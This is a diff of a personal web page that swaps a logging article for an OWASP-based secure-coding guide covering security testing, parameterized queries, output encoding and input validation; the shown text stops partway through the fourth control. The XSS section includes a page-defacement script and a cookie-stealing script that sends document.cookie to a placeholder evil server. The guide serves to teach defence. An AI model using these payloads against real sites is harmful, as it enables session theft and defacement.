@@ -6,8 +6,8 @@
     <meta name="viewport" content="initial-scale=1">
 
     <base href="">
-    <meta charset="utf-8" name="Jerry Shaughnessy" content="Jerry Shaughnessy - Logging" />
-    <title>Jerry Shaughnessy - Monitoring - Logging</title>
+    <meta charset="utf-8" name="Jerry Shaughnessy" content="Jerry Shaughnessy - Security Best Practices" />
+    <title>Jerry Shaughnessy - Security - Best Practices</title>
     <link rel="apple-touch-icon" sizes="57x57" href="/assets/apple-icon-57x57.png">
     <link rel="apple-touch-icon" sizes="60x60" href="/assets/apple-icon-60x60.png">
     <link rel="apple-touch-icon" sizes="72x72" href="/assets/apple-icon-72x72.png">
@@ -28,15 +28,15 @@
     <link rel="shortcut icon" type="image/png" href="/assets/favicon.ico" />
     <link rel="canonical" href="https://itdesigner.github.io/guidance" />
     <meta property="og:site_name" content="Jerry Shaughnessy - Strategic and Architectural Leader" />
-    <meta property="og:title" content="Jerry Shaughnessy - Monitoring - Logging" />
+    <meta property="og:title" content="Jerry Shaughnessy - Security - Best Practices" />
     <meta property="og:url" content="https://itdesigner.github.io/guidance" />
     <meta property="og:type" content="website" />
-    <meta itemprop="name" content="Jerry Shaughnessy - Monitoring" />
+    <meta itemprop="name" content="Jerry Shaughnessy - Security" />
     <meta itemprop="url" content="https://itdesigner.github.io/guidance" />
-    <meta name="twitter:title" content="Jerry Shaughnessy - Monitoring - Logging" />
+    <meta name="twitter:title" content="Jerry Shaughnessy - Security - Best Practices" />
     <meta name="twitter:url" content="https://itdesigner.github.io/guidance" />
-    <meta name="twitter:card" content="Jerry Shaughnessy - Monitoring" />
-    <meta name="description" content="Jerry Shaughnessy - Monitoring - Logging" />
+    <meta name="twitter:card" content="Jerry Shaughnessy - Security" />
+    <meta name="description" content="Jerry Shaughnessy - Security - Best Practices" />
     <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Fjalla+One:400|Libre+Franklin:400,700,700i,400i,500" />
     <script type="text/javascript">
         SQUARESPACE_ROLLUPS = {};
@@ -671,8 +671,8 @@
                         <div class="sqs-layout sqs-grid-12 columns-12" data-type="page" data-updated-on="1537474212286" id="page-5ba3fe861905f4a18415c878">
                             <div class="row sqs-row">
                               <div class="txt-article txt-article-header">
-                                <h1>Logging</h1>
-                                <h2><i>What and how should you be logging?</i></h2>
+                                <h1>Secure Coding Best Practices</h1>
+                                <h2><i><b>Security is no longer optional</b> for developers</i></h2>
                               </div>
                             </div>
                             <div class="row sqs-row">
@@ -688,8 +688,8 @@
                                             <div class="image-block-outer-wrapper layout-caption-below design-layout-inline combination-animation-fade-in individual-animation-none individual-text-animation-none">
                                                 <div class="intrinsic img-article">
                                                     <div style="padding-bottom:30.0%;" class="image-block-wrapper   has-aspect-ratio" data-description="">
-                                                        <noscript><img src="/images/logio.png"  alt="logging output"  /></noscript>
-                                                        <img class="thumb-image" alt="logging output" data-src="/images/logio.png" data-image="/images/logio.png" data-image-dimensions="600x420" data-image-focal-point="0.5,0.5" data-load="false" data-image-id="5ba3fe9e9140b7f386765a33"
+                                                        <noscript><img src="/images/secure-code3.png"  alt="secure code"  /></noscript>
+                                                        <img class="thumb-image" alt="secure code" data-src="/images/secure-code3.png" data-image="/images/secure-code3.png" data-image-dimensions="1280x562" data-image-focal-point="0.5,0.5" data-load="false" data-image-id="5ba3fe9e9140b7f386765a33"
                                                             data-type="image" />
                                                     </div>
                                                 </div>
@@ -700,14 +700,20 @@
                                         <div class="col sqs-col-12 span-12">
                                             <div class="sqs-block html-block sqs-block-html  txt-article" data-block-type="2" id="block-acc6abc30d4c3eafb2ad">
                                                 <div class="sqs-block-content">
-                                                    <p>The importance of adding and managing logging in any application cannot be overstated. If used correctly, logs 
-                                                        can contain a wealth of information about a specific event or failure. Logs can tell us not only when the event took place but also 
-                                                         provide us with details as to why it has occurred.</p>
-                                                    <p>However, to ensure that application logs are actually useful, there are some basic requirements. First and foremost, they need 
-                                                        to be digestible. What I mean is that they need to be structured in a way that both humans and machines can read. Complying with 
-                                                        this requirement requires careful planning and strategizing but also ensures that searching and analyzing the logs will 
-                                                        be easier and can actually be automated to a great extent.</p>
-                                                    <p>Here, I will be discussing some tips and best practices I use when working with development teams when setting up logging for their applications.</p>
+                                                    <p>As cybersecurity risks steadily increase, application security has become an absolute necessity. That means secure
+                                                        coding practices must be part of every developer’s skill set. How you write code, and the steps you take to update and
+                                                        monitor it, have a big impact on your applications, your  organization, and your ability to do your job well. </p>
+                                                    <p>This guide will give you practical tips in using secure coding best practices. It’s based on the OWASP Top 10
+                                                        Proactive Controls — widely considered the gold standard for application security — but translated into a concise,
+                                                        easy-to-use format. You’ll get a brief overview of each control, along with coding examples, actionable advice,
+                                                        and further resources to help you create secure software.</p>
+                                                    <p>As you dive in to this section, it is best to keep in mind that the actions I recommend are not against "imaginary" threats.  
+                                                        These threats are very real and these vulnerabilities are found in a suprising number of websites and commerical products. 
+                                                        Below, take a look at what WhitehatSecurity has found in the wild.
+                                                    </p>
+                                                    <br>
+                                                    <img class="img-grow-wide" alt="vulnerabilites in the wild" src="/images/whitehat-vulnerability-profiles.png" data-src="/images/whitehat-vulnerability-profiles.png" data-image="/images/gof-composite-example.png" data-image-dimensions="500x564" data-image-focal-point="0.5,0.5"
+                                                        data-load="false" data-image-id="5ba3fe9e9140b7f386765a31" data-type="image" style="left: 10%; top: 0px; display: block; margin-left:auto; margin-right:auto;" />
                                                 </div>
                                             </div>
                                         </div>
@@ -716,12 +722,36 @@
                                         <div class="col sqs-col-12 span-12">
                                             <div class="sqs-block html-block sqs-block-html txt-article" data-block-type="2" id="block-acc6abc30d4c3eafb2ad">
                                                 <div class="sqs-block-content">
-                                                    <h2>What is your logging goal?</h2>
-                                                    <p>The most important part of planning a logging strategy is understanding your goal. <i><b>What is it that you are trying to achieve with logging?</b></i> 
-                                                        Is it business intelligence?  Is the purpose development, debugging,and failure analysis? </p>
-                                                    <p>This might seem like common sense advice; but, in practice, failing to accurately understand your goals results in noisy and hard to read logs along with 
-                                                        resources wasted on analyzing them.</p>
-                                                    <p>Your goals will affect literally everything about the way that you log - from what you actually capture to how it is formatted and analyzed.  </p>
+                                                    <div class="best-practices-block">
+                                                        <div class="bp-header">
+                                                            <div class="id"> 1</div>
+                                                            <h2> Verify for Security Early and Often</h2>
+                                                        </div>
+                                                        <div class="bp-body">
+                                                            <p>It used to be standard practice for the security team to do security testing near the end of a project and then hand the results over to developers for remediation.
+                                                                But tackling a laundry list of fixes just before the application is scheduled to go to production isn’t acceptable anymore. It also increases the risk of a breach. You
+                                                                need the tools and processes for manual and automated testing during coding.
+                                                            </p>
+                                                            <hr>
+                                                            <h3>GUIDANCE</h3>
+                                                            <ul>
+                                                                <li>Consider the OWASP Application Security Verification Standard as a guide to define security requirements and generate test cases</li>
+                                                                <li>Scrum with the security team to ensure testing methods fix any defects</li>
+                                                                <li>Add a security champion to each development team. A security champion is a developer with an interest in security who helps amplify
+                                                                    the security message at the team level. Security champions don’t need to be security pros; they just need to act as the security conscience of the team,
+                                                                    keeping their eyes and ears open for potential issues. Once the team is aware of these issues, it can then either fix the issues in development or call in your
+                                                                    organization’s security experts to provide guidance.</li>
+                                                                <li>Consider data protections from the beginning. Include security up front when agreeing upon the definition of “done” for a project</li>
+                                                                <li>Integrate security testing in continuous integration to create fast, automated feedback loops</li>
+                                                            </ul>
+                                                            <hr>
+                                                            <h3>ADDITIONAL RESOURCES</h3>
+                                                            <ul class="checkItem">
+                                                                <li><a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project" target="_blank">OWASP Application Security Verification Standard Project</a></li>
+                                                                <li><a href="https://www.owasp.org/index.php/OWASP_Testing_Project" target="_blank">OWASP Testing Guide</a></li>
+                                                            </ul>
+                                                        </div>
+                                                    </div>
                                                 </div>
                                             </div>
                                         </div>
@@ -730,207 +760,416 @@
                                         <div class="col sqs-col-12 span-12">
                                             <div class="sqs-block html-block sqs-block-html txt-article" data-block-type="2" id="block-c15ad40843fc74840dfc">
                                                 <div class="sqs-block-content">
-                                                    <h2>What should you log?</h2>
-                                                    <p>In my role, and through the years, I've seen just about every logging approach you can imagine.  At some companies, I've seen teams take the approach to log 
-                                                        EVERYTHING under the assumption that it will all be valuable at some point. Fact is, that in many cases, I’ve seen this “log as if there is no tomorrow” 
-                                                        approach result in: a) logs that are so noisy that it is just about impossible to find anything, b) logging that is so pervasive thatit actually impacts the 
-                                                        application being logged, and, c) needlessly expensive logging costs for storage and retention.</p>
-                                                    <p>Once you’ve understood what you’re aiming to achieve with your logging, you can begin devising a strategy that defines what you want to log, and perhaps even 
-                                                        more importantly — <b>what you don’t want to log</b>.</p> 
-                                                </div>
-                                            </div>
-                                        </div>
-                                    </div>
-                                    <div class="row sqs-row">
-                                        <div class="col sqs-col-12 span-12">
-                                            <div class="sqs-block html-block sqs-block-html  txt-article" data-block-type="2" id="block-c15ad40843fc74840dfc">
-                                                <div class="sqs-block-content">
-                                                    <h2>Choose and use a uniform logging framework!</h2>
-                                                    <p>Logging frameworks give developers a way to implement logging in a consistant, standard and easy-to-configure way. They allow developers to control verbosity, 
-                                                        define log levels, configure multiple connections or targets, devise a log rotation policy, and so forth.  Almost all will also allow your teams to enable and 
-                                                        disable logging as needed.</p>
-                                                    <p>You could, of course, build your own logging framework, vver the years I've certainly done that myself.  But, why do that if there are already tools out there 
-                                                        that are easy to use, have community support, and most importantly — do the job perfectly well?  Many of the available logging frameworks have been around for some time, 
-                                                        and you would be hard pressed to match their versatility or robustness.  They are available in just about every language imaginable and there is no longer any 
-                                                        reason to roll your own.</p>
-                                                    <p>So one of the most important decisions you and your teams will make is which logging library, or framework, to use. This task can be complicated at times and 
-                                                        pretty time consuming as there are such a large number of these tools available. Key considerations when selecting one should be ease of use, community, 
-                                                        feature-richness, and the impact on your application’s performance.</p>
-                                                </div>
-                                            </div>
-                                        </div>
-                                    </div>
-                                    <div class="row sqs-row">
-                                        <div class="col sqs-col-12 span-12">
-                                            <div class="sqs-block html-block sqs-block-html  txt-article" data-block-type="2" id="block-c15ad40843fc74840dfc">
-                                                <div class="sqs-block-content">
-                                                    <h2>Standardize your approach</h2>
-                                                    <p>The more standardized your approach to logging, the easier it is to find what you need and analyze them.  The logging framework you end up using will help you 
-                                                        with this, but there is still plenty of work to be done to ensure your log messages are all constructed the same way.</p>
-                                                    <p>For starters, be sure developers understand when to use each log level. This will help avoid situations in which different log messages are assigned the same 
-                                                        severity or where critical events go unnoticed because of the wrong severity assigned to it.</p> 
-                                                    <p>Second, create a standard for formatting and naming fields. We’ve come across the same error logged in a totally different way depending on who added the logging 
-                                                        message - this should NOT happen. These logging standards include everything from deciding the format you want to use for the timestamp field and whether you will 
-                                                        format your logs in JSON or as key=value pairs.</p>
-                                                    <p>In that spirit, I will attempt to set a few standards that I have found useful and should act as a starting point when you are deciding how to implement logging
-                                                        in your application(s).</p>
-                                                    <div style="padding-left: 25px; padding-top: 20px;">
-                                                        <h3 style="font-size: large;color: cadetblue;">Create entries that humans can actually read</h3>
-                                                        Avoid using complex encoding or layouts that make even the most basic information unintelligible.  Specifically, developers like the ability to read logs for details 
-                                                        of events while at the same time we want them to be processed by any monitoring system we may be using.  Developer-friendly formats like JavaScript Object Notation (JSON) 
-                                                        are readable by humans and machines.<br><br>
-                                                        <h3 style="font-size: large;color: cadetblue;">Use clear and unambiguous key-value pairs</h3>
-                                                        One of the most powerful features of proper logging is the ability to extract fields and create structured data that can be filtered and pivoted against.  Use the 
-                                                        template strategy for logging whenever possible.<br><br>
-                                                        <h3 style="font-size: large;color: cadetblue;">Start small</h3>
-                                                        It is much better to start with a small number of logs and then add to them over time rather than to start with a large 
-                                                        collection and trying to winnow it down.  Let teams get used to using their logs, and let them add more where and when they see value.  Avoid the noise problem.
-                                                        <br><br>
-                                                        <h3 style="font-size: large;color: cadetblue;">Be concise and descriptive</h3>
-                                                        Each logging statement should contain both data and description. See this as an example:<br><br>
-<div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">log.debug(<span style="background-color: #fff0f0">&quot;Message processed&quot;</span>);
-log.debug(message.getMessageID());
-	 
-log.debug(<span style="background-color: #fff0f0">&quot;Message with id &#39;{}&#39; processed&quot;</span>, message.getMessageID());
+                                                    <div class="best-practices-block">
+                                                        <div class="bp-header">
+                                                            <div class="id">2</div>
+                                                            <h2>Parameterize Queries</h2>
+                                                        </div>
+                                                        <div class="bp-body">
+                                                            <p>SQL injection is one of the most dangerous application risks, partly because attackers can use open source attack tools to exploit these common vulnerabilities.
+                                                                You can control this risk using query parameterization. This type of query specifies placeholders for parameters, so the database will always treat them as data, rather
+                                                                than part of a SQL command. You can use prepared statements, and a growing number of frameworks, including Rails, Django, and Node.js, use object relational
+                                                                mappers to abstract communication with a database.
+                                                            </p>
+                                                            <hr>
+                                                            <h3>GUIDANCE</h3>
+                                                            <ul>
+                                                                <li>Parameterize the queries by binding the variables.</li>
+                                                                <li>Be cautious about allowing user input into object queries (OQL/HQL) or other advanced queries supported by the framework.</li>
+                                                                <li>Defend against SQL injection using proper database management system configuration.</li>
+                                                            </ul>
+                                                            <hr>
+                                                            <h3>EXAMPLES</h3>
+                                                            <p>Here is an example of query parametization in C#:</p>
+<div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #a7a7a7; font-weight: bold">string</span> sql = <span style="color: #CD5555">&quot;SELECT * FROM Customers WHERE CustomerId = @CustomerId&quot;</span>;
+SqlCommand command = <span style="color: #8B008B; font-weight: bold">new</span> SqlCommand(sql);
+command.Parameters.Add(<span style="color: #8B008B; font-weight: bold">new</span> SqlParameter(<span style="color: #CD5555">&quot;@CustomerId&quot;</span>, System.Data.SqlDbType.Int));
+command.Parameters[<span style="color: #CD5555">&quot;@CustomerId&quot;</span>].Value = <span style="color: #B452CD">1</span>;
 </pre></div>
-                                                        <br>You will notice here that the final logging statement contains far more information in a single line.  It is much easier for a human to read it and understand what is 
-                                                        happening. It is also more useful because, depending on the destination of where your logs are written, they may well be separated by dozens or hundreds of lines.<br><br>
-                                                        <h3 style="font-size: large;color: cadetblue;">Use timestamps on every log statement</h3>
-                                                        The correct time is critical to understanding the proper sequence of events.  Your selected framework should automatically timestamp logging events.
-                                                        <br><br>
-                                                        <h3 style="font-size: large;color: cadetblue;">Use unique identifiers</h3>
-                                                        Unique identifiers such as transaction IDs and user IDs are tremendously helpful when debugging, and even more helpful when you are gathering analytics. Unique IDs can 
-                                                        point you to the exact transaction. Without them, you might only have a time range to use. When possible, carry these IDs through multiple touch points and avoid changing 
-                                                        the format of these IDs between modules. That way, you can track transactions through the system and follow them across machines, networks, and services.
-                                                        <br><br>
-                                                        <h3 style="font-size: large;color: cadetblue;">Log more than DEBUG statements</h3>
-                                                        Put semantic meaning in events to get more out of the data. Log audit trails, what users are doing, transactions, timing information, and so on. Log anything that can add 
-                                                        value when aggregated, charted, or further analyzed. In other words, log anything that is interesting to the business.
-                                                        <br><br>
-                                                        <h3 style="font-size: large;color: cadetblue;">Identify sources and destinations</h3>
-                                                        Include the source and, if appropriate, the target of the log event.  This information should include system, sub-system, application domain, type, and any context 
-                                                        information available such as transaction ID, etc.  The goal here is to provide useful context in which a logging event occurred.  Why do this?  It will help you determine: 
-                                                        what went wrong, how badly it went wrong, in the case of recovery shortly describe how (especially on WARN level), and provide possible context / description for possible 
-                                                        causes of the error.
-                                                        <br><br>
-                                                        <h3 style="font-size: large;color: cadetblue;">Use Logging Levels</h3>
-                                                        Categorize any logging events.  For example, use severity values like DEBUG, INFO, WARN, ERROR, and FATAL.  This is part of almost any logging framework and will automatically be 
-                                                        included.  There is more information on logging levels <a href="#loglevels" style="color: cadetblue;">below</a>.
-                                                        <br><br>
-                                                        <h3 style="font-size: large;color: cadetblue;">Avoid string concatenation</h3>
-                                                        String concatenation is expensive and resource consuming, use substitution parameters instead.
-                                                        <br><br>
-                                                        <h3 style="font-size: large;color: cadetblue;">Watch out for external systems</h3>
-                                                        If you communicate with an external system, consider logging every piece of data that comes out from your application and gets in. Period.
-                                                        <br><br>
-                                                        <h3 style="font-size: large;color: cadetblue;">Log exceptions</h3>
-                                                        Logging exceptions is one of the most important roles of logging.  At a minimum, every Try/Catch should include a logging statement. Don’t swallow exceptions unless 
-                                                        you are 100% certain that you don’t need to handle them (this is rare).
-                                                        <br><br>
-                                                        <h3 style="font-size: large;color: maroon;">Do NOT log sensitive information</h3>
-                                                        This includes obvious things such as passwords, but it also includes business information that the log user doesn’t need to know.  
-                                                        <br><br>
-                                                        <h3 style="font-size: large;color: cadetblue;">Logging in production should only be set to WARN or above</h3>
-                                                        You want to have exception/problem information available for first-pass problem determination in a production level enterprise application without turning on 
-                                                        debug as a default log level. There is simply too much information in debug to be appropriate for day-to-day operations.
-                                                        <br><br>
-                                                        <h3 style="font-size: large;color: cadetblue;">Don't try and optimize until you need to</h3>
-                                                        Pre-optimization of logging performance is typically wasteful – don’t completely ignore performance while logging, but, in general, logging performance is good 
-                                                        and will not substantially affect your code if you are using it responsibly.
-                                                        <br><br>
+                                                            <p>Here is an example of query parameterization in Java:</p>
+<div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">String newName = request.<span style="color: #658b00">getParameter</span>(<span style="color: #CD5555">&quot;newName&quot;</span>);
+<span style="color: #a7a7a7; font-weight: bold">int</span> id = Integer.<span style="color: #658b00">parseInt</span>(request.<span style="color: #658b00">getParameter</span>(<span style="color: #CD5555">&quot;id&quot;</span>));
+PreparedStatement pstmt = con.<span style="color: #658b00">prepareStatement</span>(<span style="color: #CD5555">&quot;UPDATE EMPLOYEES SET NAME = ? WHERE ID = ?&quot;</span>);
+pstmt.<span style="color: #658b00">setString</span>(<span style="color: #B452CD">1</span>, newName);
+pstmt.<span style="color: #658b00">setInt</span>(<span style="color: #B452CD">2</span>, id);
+</pre></div>                                                                       
+                                                            <hr>
+                                                            <h3>ADDITIONAL RESOURCES</h3>
+                                                            <ul class="checkItem">
+                                                                <li><a href="https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet" target="_blank">OWASP Query Parameterization Cheat Sheet</a></li>
+                                                                <li><a href="https://www.veracode.com/blog/intro-appsec/sql-injection-attacks-and-how-prevent-them-infographic" target="_blank">SQL Injection Attacks and How to Prevent Them Infographic</a></li>
+                                                            </ul>
+                                                        </div>
                                                     </div>
                                                 </div>
-                                            </div>
-                                        </div>
-                                    </div>
-                                    <div id="loglevels" class="row sqs-row">
-                                        <div class="col sqs-col-12 span-12">
-                                            <div class="sqs-block html-block sqs-block-html txt-article" data-block-type="2" id="block-c15ad40843fc74840dfc">
-                                                <div class="sqs-block-content">
-                                                    <h2>Logging Levels</h2>
-                                                    <p>Categorize any and all logging events appropriately.  For example, use severity values like VERBOSE, DEBUG, INFO, WARNING, ERROR, and FATAL.  The selected level 
-                                                        is typically part of any logging framework and will automatically be included.  The typical logging levels from highest to lowest are:</p>
-                                                    <div style="padding-left: 25px; padding-top: 20px;">
-                                                        <h3 style="font-size: large;color:maroon;">FATAL / CRITICAL</h3>
-                                                        Severe errors that cause premature termination and critical errors causing complete failure of the application. Expect these to be immediately visible on any 
-                                                        status console because they need to be dealt with immediately.
-                                                        <br><br>
-                                                        <i>Considerations:  This is an overall application or system failure that should be investigated immediately. Yes, wake up the Admin. Since we prefer our 
-                                                            Admins alert and well-rested, this severity should be used very infrequently. If it's happening daily and that's not a very big deal, it's lost it's meaning. 
-                                                            Typically, a Fatal error only occurs once in the process lifetime, so if the log is tied to the process, this is typically the last message in the log.</i>
-                                                        <br><br>
-                                                        <h3 style="font-size: large;color:red;">ERROR</h3>
-                                                        Something terribly wrong had happened, that must be investigated immediately. Indicates a failure within the application or connected system.  No system can tolerate 
-                                                        items logged on this level. Example: NPE, database unavailable, mission critical use case cannot be continued.  Expect these to be immediately visible on any status console.
-                                                        <br><br>
-                                                        <i>Considerations:  This is definitely a problem that should be investigated. Admin should be notified automatically, but doesn't need to be dragged out of bed. By filtering a log to 
-                                                            look at errors and above you get an overview of error frequency and can quickly identify the initiating failure that might have resulted in a cascade of additional 
-                                                            errors. Tracking error rates as versus application usage can yield useful quality metrics such as MTBF (Mean time Between Failures) which can be used to assess overall 
-                                                            quality. For example, this metric might help inform decisions about whether or not another beta testing cycle is needed before a release.</i>
-                                                        <br><br>
-                                                        <h3 style="font-size: large;color:orange;">WARNING</h3>
-                                                        The process might be continued, but take extra caution, typically used as indicators of possible issues or service/functionality degradation.   This level of logging 
-                                                        comprises two distinct types of information: one for obvious problems where work-around exists (for example: “Current data unavailable, using cached values”) and second 
-                                                        for potential problems and suggestions. The application can tolerate warning messages, but they should always be justified and examined.  Examples might include: 
-                                                        use of deprecated APIs, poor use of API, 'almost' errors, other run-time situations that are undesirable or unexpected, but not necessarily "wrong", “Application 
-                                                        running in development mode” or “Administration console is not secured with a password”.  Expect these to be immediately visible on any status console.
-                                                        <br><br>
-                                                        <i>Considerations:  This MIGHT be problem, or might not. For example, expected transient environmental conditions such as short loss of network or database connectivity should be logged 
-                                                            as Warnings, not Errors. Viewing a log filtered to show only warnings and errors may give quick insight into early hints at the root cause of a subsequent error. 
-                                                            Warnings should be used sparingly so that they don't become meaningless. For example, loss of network access should be a warning or even an error in a server application, 
-                                                            but might be just an Info in a desktop app designed for occasionally disconnected laptop users.</i>
-                                                        <br><br>
-                                                        <h3 style="font-size: large;color:darkgreen;">INFO</h3>
-                                                        Events of interest or that have relevance to outside observers; the default enabled minimum logging level.  Examples include: important business process has started or 
-                                                        finished. In an ideal world, an administrator or advanced user should be able to understand INFO messages and quickly find out what the application is doing. Other 
-                                                        definition of INFO message: each action that changes the state of the application significantly (database update, external system request).  Expect that it is likely 
-                                                        for these to be visible on any status console.
-                                                        <br><br>
-                                                        <i>Considerations:  This is important information that should be logged under normal conditions such as successful initialization, services starting and stopping or successful completion 
-                                                            of significant transactions. Viewing a log showing Info and above should give a quick overview of major state changes in the process providing top-level context for 
-                                                            understanding any warnings or errors that also occur. Don't have too many Info messages. <b>We typically have < 5% Info messages relative to Verbose.</b></i>
-                                                        <br><br>
-                                                        <h3 style="font-size: large;color:mediumblue;">DEBUG</h3>
-                                                        Internal control flow and diagnostic state dumps to facilitate pinpointing of recognized problems.  This level should not normally be enabled in a production environment 
-                                                        unless you are attempting to troubleshoot a problem.
-                                                        <br><br>
-                                                        <i>Considerations:  This level and verbose are used almost exclusively by developers to troubleshoot specific problems.  The information here exists at a detailed level about logical operations 
-                                                            that are occurring within the code that can be used by the developer to determine the flow of a process through the system.  </i>
-                                                        <br><br>
-                                                        <h3 style="font-size: large;color:darkslategray;">VERBOSE</h3>
-                                                        Tracing information and debugging minutiae; generally only switched on in unusual situations.  Examples include performance level logging and loop counters.
-                                                        <br><br>
-                                                        <i>Considerations:  This is the the most detailed level of logging and will only be used by developers with a deep understanding of the code to troubleshoot intricate problems.  This is 
-                                                            typically the most commonly used severity level for things like performance metrics and logging specific details about internal state of functions in the environment.</i>
-                                                        <br><br>
-                                                </div>
-                                                <p>When choosing an appropriate log level for a particular logging entry it is best to consider how the information will be used by the consumer of a log. <b>The Audience matters</b>! Administrative users 
-                                                    will typically only see logging levels at INFO and higher. The higher the level , the more importance that it should take in their mind and be more specific and actionable with 
-                                                    the messages as the level increases.  While developers will be able to see all logging levels, the information found in the DEBUG and certainly the VERBOSE log levels is mostly 
-                                                    of use to them and should be targeted appropriately.</p>
                                             </div>
                                         </div>
                                     </div>
                                     <div class="row sqs-row">
-                                            <div class="col sqs-col-12 span-12">
-                                                <div class="sqs-block html-block sqs-block-html  txt-article" data-block-type="2" id="block-c15ad40843fc74840dfc">
-                                                    <div class="sqs-block-content">
-                                                        <h2>Additional Resources</h2>
-                                                        <p>There are countless articles from both vendors and thought leaders on what are logging best practices and which framework you should be using.  I prefer to keep it simple and 
-                                                            focus only on things that are universal.  The answer as to which frameworkto use and what your exact standards should be are really a matter for your team to decide.  After all,
-                                                            they understand their needs bettwe than anyone else.  Just make sure that it is uniformly applied.
-                                                        </p>
-                                                        <ul style="list-style: none">
-                                                            <li><a href="https://serilog.net/" target="_blank">SeriLog (my personal favorite)</a></li>
-                                                            <li><a href="https://logging.apache.org/log4net/" target="_blank">log4net</a></li>
-                                                            <li><a href="https://www.geeksforgeeks.org/logging-in-java/" target="_blank">Logging in Java</a></li>
-                                                            <li><a href="https://www.loggly.com/ultimate-guide/java-logging-basics/" target="_blank">Logging in JavaL the Ultimate Guide</a></li>
-                                                            <li><a href="https://hackernoon.com/rich-typescript-logger-decorator-for-easy-coding-fc2ff73684c6" target="_blank">Decoratorsfor Logging in Typescript</a></li>
-                                                        </ul>
+                                        <div class="col sqs-col-12 span-12">
+                                            <div class="sqs-block html-block sqs-block-html  txt-article" data-block-type="2" id="block-c15ad40843fc74840dfc">
+                                                <div class="sqs-block-content">
+                                                    <div class="best-practices-block">
+                                                        <div class="bp-header">
+                                                            <div class="id"> 3</div>
+                                                            <h2>Encode Data</h2>
+                                                        </div>
+                                                        <div class="bp-body">
+                                                            <p>Encoding translates potentially dangerous special characters into an equivalent form that renders the threat ineffective. This technique is applicable for a
+                                                                variety of platforms and injection methods, including UNIX command encoding, Windows command encoding, and cross-site scripting (XSS). Encoding
+                                                                addresses the three main classes of XSS: persistent, reflected, and DOM-based
+                                                            </p>
+                                                            <hr>
+                                                            <h3>GUIDANCE</h3>
+                                                            <ul>
+                                                                <li>Treat all data as untrusted, including dynamic content consisting of a mix of static, developer-built HTML/JavaScript, and data that was originally
+                                                                    populated with user input</li>
+                                                                <li>Develop relevant encoding to address the spectrum of attack methods, including injection attacks.</li>
+                                                                <li>Use output encoding, such as JavaScript hex encoding and HTML entity encoding. </li>
+                                                                <li>Monitor how dynamic webpage development occurs, and consider how JavaScript and HTML populate user input, along with the risks
+                                                                    of untrusted sources.</li>
+                                                            </ul>
+                                                            <hr>
+                                                            <h3>THOUGHTS</h3>
+                                                            <p>This category includes some of the most common attacks that can be found in the wild - including Cross-Site-Scripting (XSS).  Cross-site-scripting is where things begin to get 
+                                                                really interesting, starting with the fact that it’s by far and away the most <b>commonly exploited vulnerability</b> out there today. Recently, WhiteHat Security delivered 
+                                                                their Website Security Statistics Report and found a staggering 65% of websites with XSS vulnerabilities, that’s four times as many as the SQL injection vulnerability 
+                                                                we just looked at in number <b>2</b>.</p>
+                                                            <p>One of the best descriptions I’ve heard of XSS was on one of the OWASP podcasts where it was described it as <i>“breaking out of a data context and entering 
+                                                                a code context”</i>. So think of it as a vulnerable system expecting a particular field to be passive data when in fact it carries a functional payload which actively causes an event 
+                                                                to occur. The event is normally a request for the browser to perform an activity outside the intended scope of the web application. In the context of security, this will often be 
+                                                                an event with malicious intent.</p>
+                                                            <hr>
+                                                            <h3>EXAMPLES - Cross Site Scripting</h3>
+                                                            <p>This is a common example of a common XSS site defacement</p>
+<div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #8B008B; font-weight: bold">&lt;script&gt;</span><span style="color: #658b00">document</span>.body.innerHTML(<span style="color: #CD5555">&quot;Jim was here&quot;</span>);<span style="color: #8B008B; font-weight: bold">&lt;/script&gt;</span>
+</pre></div>
+                                                            <p>Example XSS session theft</p>
+<div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #8B008B; font-weight: bold">&lt;script&gt;</span>
+<span style="color: #8B008B; font-weight: bold">var</span> img = <span style="color: #8B008B; font-weight: bold">new</span> Image();
+img.src=<span style="color: #CD5555">&quot;http://&lt;some evil server&gt;.com?&quot;</span> + <span style="color: #658b00">document</span>.cookie;
+<span style="color: #8B008B; font-weight: bold">&lt;/script&gt;</span>
+</pre></div>
+                                                            <p>The good news is that despite how common these attacks are, they are relativly easy to defend against.</p>
+                                                            
+                                                            <hr>
+                                                            <h3>ADDITIONAL RESOURCES</h3>
+                                                            <ul class="checkItem">
+                                                                <li><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank">OWASP XSS Filter Evasion Cheat Sheet</a></li>
+                                                                <li><a href="https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet" target="_blank">OWASP DOM based XSS Prevention Cheat Sheet</a></li>
+                                                            </ul>
+                                                        </div>
                                                     </div>
                                                 </div>
                                             </div>
                                         </div>
+                                    </div>
+                                    <div class="row sqs-row">
+                                        <div class="col sqs-col-12 span-12">
+                                            <div class="sqs-block html-block sqs-block-html  txt-article" data-block-type="2" id="block-c15ad40843fc74840dfc">
+                                                <div class="sqs-block-content">
+                                                    <div class="best-practices-block">
+                                                        <div class="bp-header">
+                                                            <div class="id">4</div>
+                                                            <h2>Validate ALL Inputs</h2>
+                                                        </div>
+                                                        <div class="bp-body">
+                                                            <p>It's vitally important to ensure that all data is syntactically and semantically valid as it arrives and enters a system. As you approach the task, assume that
+                                                                all data and variables can’t be trusted, and provide security controls regardless of the source of that data. Valid syntax means that the data is in the form that's
+                                                                expected — including the correct number of characters or digits. Semantic validity means that the data has actual meaning and is valid for the interaction
+                                                                or transaction. Whitelisting is the recommended validation method. 
+                                                            </p>
+                                                            <hr>
+                                                            <h3>GUIDANCE</h3>
+                                                            <ul>
+                                                                <li>Consider the OWASP Application Security Verification Standard as a guide to define security requirements and generate test cases</li>
+                                                                <li>Scrum with the security team to ensure testing methods fix any defects</li>
